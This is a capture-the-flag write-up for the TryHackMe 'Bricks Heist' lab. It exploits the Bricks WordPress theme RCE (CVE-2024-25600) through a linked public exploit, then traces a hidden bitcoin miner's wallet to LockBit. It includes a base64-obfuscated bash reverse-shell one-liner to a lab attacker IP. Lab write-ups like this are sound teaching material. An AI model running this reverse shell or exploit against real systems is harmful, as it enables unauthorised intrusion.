---
title: 'TryHack3M: Bricks Heist'
description: 'Exploiting Wordpress v1.9.5 (CVE-2024-25600) and blockchain forensics'
pubDate: 2024-12-19
category: 'tryhackme'
tags: ['blockchain', 'mining']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/0a46e92e8a9255f7dde294569e05dae1.png'
---

Looking at the website we quickly find out that its a Wordpress site.

When running `wp-scan` we see its using an old version.

```bash
wpscan --url https://bricks.thm -e ap --disable-tls-checks
...[snip]...
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
...[snip]...
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
```

Looking for an exploit for this particular version we quickly find an RCE: https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/refs/heads/main/CVE-2024-25600.py

When running the exploit we get a shell:

```bash
python CVE-2024-25600.py -u https://bricks.thm
...[snip]...
[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> id
uid=1001(apache) gid=1001(apache) groups=1001(apache)
```

Lets upgrade to a regular reverse shell:

```bash
Shell> echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS41MS4yNC80NDQ0IDA+JjE= | base64 -d | bash
```

Looking at the processes on the system we find something that stands out:
```bash
systemctl list-units --type=service --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                              >
  accounts-daemon.service                        loaded active running Accounts Service                         >
  acpid.service                                  loaded active running ACPI event daemon
...[snip]...
  ubuntu.service                                 loaded active running TRYHACK3M
```

Lets explore the `ubuntu.service` service:

```bash
systemctl -l status ubuntu.service
- ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2024-12-19 09:21:26 UTC; 2min 16s ago
   Main PID: 2715 (nm-inet-dialog)
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/ubuntu.service
             ├─2715 /lib/NetworkManager/nm-inet-dialog
             └─2716 /lib/NetworkManager/nm-inet-dialog
```

Checking this config:

```bash
systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Checking the NetworkManager config:

```bash
cat /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
...[snip]...
```

When putting that ID in Cyberchef and trying the magic method it converts it to: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`.

It looks like its repeating at some point and since the questions are about miners and bitcoin we can assume its related to a bitcoin address.
Splitting it up the first part is this wallet: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

After a lot of googling we find:
https://blockchair.com/bitcoin/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa


On the last received transaction we see there is 1 privacy issue:
https://blockchair.com/bitcoin/transaction/50a89a628a6620216dca19f1221c138982601810fd60677ac7612a01999ae028

When searching for the sender of this transaction (`bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`) we find a security report: https://ofac.treasury.gov/recent-actions/20240220

This seems to be used but `LockBit` Ransomware group.
